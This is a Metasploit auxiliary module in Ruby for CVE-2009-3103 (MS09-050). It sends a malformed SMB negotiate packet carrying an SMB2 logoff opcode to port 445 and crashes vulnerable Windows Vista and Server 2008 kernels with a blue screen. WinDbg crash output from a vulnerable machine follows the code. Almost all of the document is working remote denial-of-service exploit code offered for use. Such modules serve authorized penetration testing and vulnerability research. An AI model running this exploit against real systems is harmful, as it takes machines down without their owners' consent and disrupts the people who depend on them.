##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference',
      'Description'    => %q{
        This module triggers a NULL pointer dereference in the SRV2.SYS kernel driver when processing
        an SMB2 logoff request before a session has been correctly negotiated, resulting in a BSOD.
        Effecting Vista SP1/SP2 (And possibly Server 2008 SP1/SP2), the flaw was resolved with MS09-050.
      },
      'Author'         => [ 'sf' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2009-3103'],
          [ 'OSVDB', '57799' ],
          [ 'MSB', 'MS09-050' ],
        ]
    ))

    register_options( [ Opt::RPORT( 445 ) ])
  end

  def run
    print_status( "Targeting host #{datastore['RHOST']}:#{datastore['RPORT']}..." )
    connect

    dialects = [ "AAAA" + [ 0xDEADC0DE ].pack( "V" ) + [ 0xCAFEF00D ].pack( "V" ), "SMB 2.002" ]

    data  = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join( '' )
    data += "A" * 128

    packet = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct

    packet['Payload']['SMB'].v['Command']       = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
    packet['Payload']['SMB'].v['Flags1']        = 0x18
    packet['Payload']['SMB'].v['Flags2']        = 0xC853
    packet['Payload']['SMB'].v['ProcessIDHigh'] = Rex::Proto::SMB::Constants::SMB2_OP_LOGOFF
    packet['Payload'].v['Payload']              = data

    packet = packet.to_s

    print_status( "Sending the exploit packet (#{packet.length} bytes)..." )
    sock.put( packet )

    response = sock.get_once

    if( not response )
      print_status( "No response. The target system has probably crashed." )
    else
      print_status( "Response received. The target system is not vulnerable:\n#{response.inspect}" )
    end

    disconnect
  end
end

=begin

Some WinDbg output from a vulnerable Vista SP2 machine:

CONTEXT:
eax=0032bfbc ebx=9beafb20 ecx=0000000a edx=00000000 esi=00000000 edi=9be8e690
eip=9935a9d1 esp=98b86cb8 ebp=98b86cc0 iopl=0         nv up ei pl nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202
srv2!RfsTableLookup+0xa:
9935a9d1 837e4800        cmp     dword ptr [esi+48h],0 ds:0023:00000048=????????

STACK_TEXT:
98b86cc0 99359f95 00000000 0032bfbc 9be8e830 srv2!RfsTableLookup+0xa
98b86cdc 99364328 9be8e690 DEADC0DE CAFEF00D srv2!SrvVerifySessionEx+0xdc
98b86d00 9935a6cc 9be8e690 00000000 9be8e690 srv2!Smb2ValidateLogoff+0x3c
98b86d3c 99374a7f 9be8e690 98c1e018 9be8e690 srv2!Smb2ValidateProviderCallback+0x501
98b86d50 9937319f 9be8e690 00000000 98c4f020 srv2!SrvProcessPacket+0x4b
98b86d7c 81a0ec42 00000000 b52bf019 00000000 srv2!SrvProcWorkerThread+0x19a
98b86dc0 81877efe 99373005 98c1e018 00000000 nt!PspSystemThreadStartup+0x9d
00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x16
=end
